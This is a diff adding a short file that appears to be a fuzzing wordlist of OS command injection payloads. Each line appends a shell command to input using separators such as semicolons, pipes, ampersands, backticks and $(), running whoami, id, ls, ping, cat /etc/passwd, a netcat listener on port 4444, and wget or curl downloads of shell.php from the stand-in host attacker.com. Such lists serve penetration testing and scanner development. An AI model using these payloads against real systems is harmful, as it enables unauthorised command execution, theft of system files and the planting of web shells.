@@ -1,0 +1,21 @@
+; whoami
+| whoami
+& whoami
+&& whoami
+|| whoami
+`whoami`
+$(whoami)
+; id
+| id
+& id
+; cat /etc/passwd
+| cat /etc/passwd
+; ls -la
+| ls -la
+; ping -c 1 127.0.0.1
+| ping -c 1 127.0.0.1
+; nc -lvp 4444
+| nc -lvp 4444
+; wget http://attacker.com/shell.php
+| wget http://attacker.com/shell.php
+; curl http://attacker.com/shell.php
